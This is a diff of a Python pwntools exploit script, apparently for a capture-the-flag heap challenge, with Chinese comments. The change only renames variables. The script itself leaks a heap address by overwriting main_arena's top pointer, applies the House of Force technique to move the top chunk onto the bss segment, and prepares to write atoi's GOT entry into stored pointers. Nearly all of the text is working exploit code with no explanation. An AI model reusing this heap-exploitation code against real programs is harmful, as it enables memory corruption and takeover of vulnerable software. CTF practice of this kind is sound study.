@@ -40,8 +40,8 @@ def g(p):
 
 # 写 main_arena 的 top 指针低字节为\x00，并泄露heap地址
 top_addr= 0x3c4b78
-mmap_size = 0x201000
-offset = mmap_size - 0x10 + top_addr + 1
+mapped_size = 0x201000
+offset = mapped_size - 0x10 + top_addr + 1
 addh("A"*0x20 ,"1"*0xf0+p64(0)+p64(0xffffffffffffffff),offset,0x200000,'2'*0x20)
 show()
 p.recvuntil("A"*0x20)
@@ -49,11 +49,11 @@ heap = u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))
 print "heap : "+hex(heap)
 
 # 利用house of force 降低topchunk到bss段
-bss = 0x6020b0 
+attack_bss = 0x6020b0 
 topchunk_addr = heap + 0x100
-attack = bss - topchunk_addr
-print "attack : "+hex(attack)
-add(attack)
+offset2 = attack_bss - topchunk_addr
+print "offset2 : "+hex(offset2)
+add(offset2)
 
 # 分配到bss段的chunk，控制bss段数据，往housed指针与room指针写atoi_got
 add(0x60)
